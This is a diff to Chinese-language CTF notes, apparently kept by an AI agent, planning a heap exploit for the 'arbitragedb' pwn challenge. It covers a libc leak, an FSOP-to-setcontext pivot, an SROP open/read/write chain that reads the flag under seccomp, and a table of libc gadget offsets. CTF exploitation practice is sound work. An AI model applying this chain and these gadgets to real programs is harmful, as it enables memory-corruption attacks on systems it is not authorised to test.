@@ -481,7 +481,33 @@ hex_encode(src, len);                      // cap 0x100 → "blob:<len>:<hex>"
 2. **Q2** 跑 `gen_poc.py` 確認 crash 與溢出落點
 3. **Q3** 確認 sys_imports 實際欄位對應
 4. libc leak（B≈0x400 → unsorted bin → fd/bk 指向 main_arena）
-5. FSOP 或蓋 ret addr → ORW ROP：`openat(-100,"/home/arbitragedb/flag",0,0)`→`read`→`write(1)`
+5. FSOP → setcontext pivot → SROP ORW chain（見下，chain 已備好）
+
+#### ORW chain 已建好：[Pwn/arbitragedb/rop.py](Pwn/arbitragedb/rop.py)
+
+- 🔴 **libc 裡完全沒有 `pop rdx`**（各種組合都掃過）→ read/write 的長度參數純 ROP 設不了
+  → **主線走 SROP**（`rt_sigreturn` 剛好在 seccomp allowlist 裡）
+  → seccomp 特地留 `rt_sigreturn` + libc 沒有 pop rdx，**應該就是出題者的預期解法**
+- SROP sigframe 有效長度 **0xe8**（`rip` 在 `+0xa8`），ORW 三步共 0x300 bytes，
+  overflow 可寫 0x1fe8 → 空間足夠
+- 🔴 **`setcontext` 是 rdx 版不是 rdi 版**（glibc 2.29+ 改的）：
+  pivot gadget 在 `setcontext+0x3d` = `0x4bebd`（`mov rsp,[rdx+0xa0]` …
+  `mov r10,[rdx+0xa8]; push r10; ret`）
+  → FSOP 觸發時必須讓 **rdx** 指向偽造 ucontext，用 rdi 會直接死掉
+- ✅ **setcontext 的 ucontext 與 SROP sigframe 偏移完全一致**
+  （rsp@0xa0 rip@0xa8 rdi@0x68 rsi@0x70 rdx@0x88）→ 同一份結構兩邊共用
+
+gadget / 符號 offset（相對 libc base，dynsym 實測）：
+```
+syscall;ret 0x0a0be6   pop rdi 0x11bc7a   pop rsi 0x05c2e7   pop rax 0x0e5dc7
+mov rdx,rax 0x146257   ret 0x0289fe
+openat 0x127c50  read 0x128310  write 0x128dd0  environ 0x219de8
+setcontext+0x3d 0x04bebd   _IO_wfile_jumps 0x211228   _IO_2_1_stdout_ 0x213580
+_IO_wdoallocbuf 0x092020   _IO_list_all 0x213480
+```
+
+**唯一還沒收斂的**：FSOP 觸發時 `rdx` 的實際落點、
+glibc 2.43 `_IO_validate_vtable` 在這條路徑的檢查點。其餘靜態全部收斂。
 
 **⚠️ 連線狀況**：pwn_agent 這個 session **送不到 `pc_agent`**
 （實測 `No agent named 'pc_agent' is reachable`，ListAgents 無 Remote Control row）。
